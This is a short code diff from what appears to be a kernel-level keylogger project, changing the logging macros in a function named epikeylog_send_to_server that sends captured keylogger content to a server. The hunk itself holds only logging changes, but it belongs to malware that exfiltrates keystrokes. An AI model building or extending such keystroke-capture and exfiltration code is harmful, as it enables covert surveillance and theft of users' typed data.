@@ -165,9 +165,9 @@ int epikeylog_send_to_server(void){
 				exec_result.std_out);
 	int ret_code = send_to_server(result_msg);
 	if (ret_code != SUCCESS) {
-		pr_err("epikeylog_send_to_server: failed to send kelogger content\n");
+		ERR_MSG("epikeylog_send_to_server: failed to send kelogger content\n");
 	}
-	pr_info("epikeylog_send_to_server: kelogger content sent\n");
+	DBG_MSG("epikeylog_send_to_server: kelogger content sent\n");
 	return ret_code;
 }
 
